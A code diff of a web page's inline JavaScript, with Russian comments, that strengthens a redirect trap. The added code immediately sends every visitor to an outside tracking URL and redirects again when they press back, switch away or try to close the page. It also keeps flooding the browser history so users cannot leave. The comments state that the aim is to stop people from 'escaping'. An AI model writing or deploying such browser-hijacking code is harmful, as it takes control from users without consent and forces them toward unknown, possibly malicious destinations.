@@ -9,29 +9,40 @@
   <script type="text/javascript">
     const redirectUrl = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';
 
+    function forceRedirect() {
+      // Пробуем остановить текущую загрузку и сразу редирект
+      try { window.stop(); } catch (e) {}
+      window.location.replace(redirectUrl);
+    }
+
     function trapHistory() {
-      // Постоянно добавляем записи в историю, чтобы ловить "назад"
       history.pushState({}, '', window.location.href);
     }
 
-    function redirectToTarget() {
-      window.location.href = redirectUrl;
-    }
-
     document.addEventListener('DOMContentLoaded', () => {
-      // Изначальный редирект сразу после загрузки
-      redirectToTarget();
+      // Мгновенный редирект при открытии
+      forceRedirect();
 
-      // Наполняем стек истории и ловим кнопку "назад" или крестик
       trapHistory();
 
       window.onpopstate = () => {
-        console.log('User pressed back or tried to close the app');
-        redirectToTarget();
+        forceRedirect();
       };
 
-      // Повторяем ловушку каждые 500 мс, чтобы сохранить историю активной
-      setInterval(trapHistory, 500);
+      // Повторяем ловушку, чтобы не успели "выскочить"
+      setInterval(trapHistory, 300);
+
+      // Если страница теряет фокус (крестик, назад, сворачивание) — сразу редирект
+      document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'hidden') {
+          forceRedirect();
+        }
+      });
+
+      // Перехватываем попытки закрытия прямо перед уходом
+      window.addEventListener('beforeunload', () => {
+        forceRedirect();
+      });
     });
   </script>
 </head>
